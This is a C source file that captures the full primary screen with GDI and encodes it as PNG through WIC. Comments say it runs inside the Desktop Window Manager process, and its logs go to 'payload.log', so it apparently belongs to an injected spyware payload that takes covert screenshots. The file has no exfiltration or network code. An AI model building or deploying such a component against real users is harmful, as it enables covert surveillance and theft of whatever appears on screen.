/* ================================================================== *
 * capture.c -- GDI screen capture + WIC PNG encoding.                  *
 *                                                                    *
 * Pipeline:                                                          *
 *   1. GetDC(NULL) -- desktop DC                                      *
 *   2. CreateCompatibleBitmap + BitBlt(SRCCOPY)                      *
 *   3. GetDIBits -> BGRA buffer                                       *
 *   4. WIC IWICBitmap + IWICBitmapEncoder(PNG) -> IStream -> bytes     *
 * ================================================================== */

#include "../../shared/common.h"
#include "capture.h"
#include "../../shared/log_secure.h"

#include <wincodec.h>
#include <objbase.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

/* CoInitialize once per DWM lifetime -- thread-safe via one-shot guard. */
static volatile LONG g_co_init = 0;
static void ensure_co(void) {
    if (InterlockedCompareExchange(&g_co_init, 1, 0) == 0) {
        CoInitializeEx(NULL, COINIT_MULTITHREADED);
        InterlockedExchange(&g_co_init, 2);
    } else {
        while (g_co_init != 2) Sleep(0);
    }
}

/* WIC GUIDs -- declared here to avoid depending on the full uuid.lib. */
static const IID IID_IWICImagingFactory2_local = {
    0x7B816B45, 0x1996, 0x4476, {0xB1, 0x32, 0xDE, 0x9E, 0x24, 0x7C, 0x8A, 0xF0}
};
static const CLSID CLSID_WICImagingFactory2_local = {
    0x317D06E8, 0x5F24, 0x433D, {0xBD, 0xF7, 0x79, 0xCE, 0x68, 0xD8, 0xAB, 0xC2}
};
static const IID IID_IWICImagingFactory_local = {
    0xEC5EC8A9, 0xC395, 0x4314, {0x9C, 0x77, 0x54, 0xD7, 0xA9, 0x35, 0xFF, 0x70}
};
static const CLSID CLSID_WICImagingFactory_local = {
    0xCACAF262, 0x9370, 0x4615, {0xA1, 0x3B, 0x9F, 0x55, 0x39, 0xDA, 0x4C, 0x0A}
};
static const GUID GUID_ContainerFormatPng_local = {
    0x1B7CFAF4, 0x713F, 0x473C, {0xBB, 0xCD, 0x61, 0x37, 0x42, 0x5F, 0xAE, 0xAF}
};
static const GUID GUID_WICPixelFormat32bppBGRA_local = {
    0x6FDDC324, 0x4E03, 0x4BFE, {0xB1, 0x85, 0x3D, 0x77, 0x76, 0x8D, 0xC9, 0x0F}
};

typedef struct IWICImagingFactory   IWICImagingFactory;
typedef struct IWICBitmap           IWICBitmap;
typedef struct IWICBitmapEncoder    IWICBitmapEncoder;
typedef struct IWICBitmapFrameEncode IWICBitmapFrameEncode;
typedef struct IPropertyBag2        IPropertyBag2;

/* We use the runtime-created interface pointers via COM QueryInterface --
 * no need to redeclare vtable structs since wincodec.h has them all. */

/* Compress a BGRA buffer to PNG bytes via WIC + memory stream. */
static int bgra_to_png(const uint8_t *bgra, UINT w, UINT h, UINT stride,
                       uint8_t **out_png, size_t *out_len) {
    ensure_co();

    IWICImagingFactory *factory = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_WICImagingFactory_local, NULL,
                                  CLSCTX_INPROC_SERVER,
                                  &IID_IWICImagingFactory_local, (void **)&factory);
    if (FAILED(hr) || !factory) {
        slog_writef("payload.log", "wic factory failed hr=0x%lx", hr);
        return 0;
    }

    /* Use CreateStreamOnHGlobal -- SHCreateMemStream is NOT HGLOBAL-backed
     * (confirmed 2026-07-05: caused GetHGlobalFromStream to return
     * E_INVALIDARG in DWM's process context). */
    IStream *stream = NULL;
    HRESULT hr_s = CreateStreamOnHGlobal(NULL, TRUE, &stream);
    if (FAILED(hr_s) || !stream) {
        slog_writef("payload.log", "cap: CreateStreamOnHGlobal hr=0x%lx", hr_s);
        factory->lpVtbl->Release(factory);
        return 0;
    }

    int ok = 0;
    IWICBitmapEncoder *encoder = NULL;
    hr = factory->lpVtbl->CreateEncoder(factory, &GUID_ContainerFormatPng_local,
                                        NULL, &encoder);
    if (FAILED(hr) || !encoder) goto done;

    hr = encoder->lpVtbl->Initialize(encoder, stream, WICBitmapEncoderNoCache);
    if (FAILED(hr)) goto done;

    IWICBitmapFrameEncode *frame = NULL;
    IPropertyBag2 *bag = NULL;
    hr = encoder->lpVtbl->CreateNewFrame(encoder, &frame, &bag);
    if (FAILED(hr) || !frame) goto done;

    hr = frame->lpVtbl->Initialize(frame, bag);
    if (FAILED(hr)) goto done;

    hr = frame->lpVtbl->SetSize(frame, w, h);
    if (FAILED(hr)) goto done;

    WICPixelFormatGUID fmt = GUID_WICPixelFormat32bppBGRA_local;
    hr = frame->lpVtbl->SetPixelFormat(frame, &fmt);
    if (FAILED(hr)) goto done;

    hr = frame->lpVtbl->WritePixels(frame, h, stride, stride * h, (BYTE *)bgra);
    if (FAILED(hr)) goto done;

    hr = frame->lpVtbl->Commit(frame);
    if (FAILED(hr)) goto done;

    hr = encoder->lpVtbl->Commit(encoder);
    if (FAILED(hr)) goto done;

    /* Copy stream to malloc'd buffer. */
    LARGE_INTEGER zero = {0}; ULARGE_INTEGER size = {0};
    stream->lpVtbl->Seek(stream, zero, STREAM_SEEK_SET, NULL);
    HGLOBAL hg = NULL;
    if (SUCCEEDED(GetHGlobalFromStream(stream, &hg)) && hg) {
        SIZE_T sz = GlobalSize(hg);
        void *base = GlobalLock(hg);
        if (base && sz > 0) {
            uint8_t *out = (uint8_t *)malloc(sz);
            if (out) {
                memcpy(out, base, sz);
                *out_png = out;
                *out_len = sz;
                ok = 1;
            }
            GlobalUnlock(hg);
        }
    }
    if (frame)   frame->lpVtbl->Release(frame);
    if (bag)     bag->lpVtbl->Release(bag);
done:
    if (encoder) encoder->lpVtbl->Release(encoder);
    if (stream)  stream->lpVtbl->Release(stream);
    if (factory) factory->lpVtbl->Release(factory);
    return ok;
}

int cap_primary_png(uint8_t **out_png, size_t *out_len) {
    if (!out_png || !out_len) return 0;
    *out_png = NULL; *out_len = 0;

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0) {
        slog_writef("payload.log", "cap: bad metrics %dx%d", w, h);
        return 0;
    }

    HDC screen_dc = GetDC(NULL);
    if (!screen_dc) { slog_write("payload.log", "cap: GetDC(NULL) failed"); return 0; }

    HDC mem_dc = CreateCompatibleDC(screen_dc);
    if (!mem_dc) { ReleaseDC(NULL, screen_dc); return 0; }

    HBITMAP bmp = CreateCompatibleBitmap(screen_dc, w, h);
    if (!bmp) { DeleteDC(mem_dc); ReleaseDC(NULL, screen_dc); return 0; }
    HGDIOBJ old = SelectObject(mem_dc, bmp);

    /* CAPTUREBLT includes layered windows (some overlays otherwise skipped). */
    BOOL blt = BitBlt(mem_dc, 0, 0, w, h, screen_dc, 0, 0, SRCCOPY | CAPTUREBLT);
    if (!blt) {
        SelectObject(mem_dc, old);
        DeleteObject(bmp); DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        slog_write("payload.log", "cap: BitBlt failed");
        return 0;
    }

    /* Read pixels top-down BGRA. */
    BITMAPINFOHEADER bi = { sizeof(bi), w, -h, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
    UINT stride = (UINT)(w * 4);
    UINT total  = stride * (UINT)h;
    uint8_t *pixels = (uint8_t *)malloc(total);
    int ok = 0;
    if (pixels) {
        int lines = GetDIBits(mem_dc, bmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
        if (lines > 0) {
            ok = bgra_to_png(pixels, (UINT)w, (UINT)h, stride, out_png, out_len);
        }
        free(pixels);
    }

    SelectObject(mem_dc, old);
    DeleteObject(bmp); DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);

    if (ok) {
        slog_writef("payload.log", "cap: %dx%d -> %zu png bytes", w, h, *out_len);
    } else {
        slog_writef("payload.log", "cap: PNG encode failed");
    }
    return ok;
}

void cap_free_png(uint8_t *png) { if (png) free(png); }
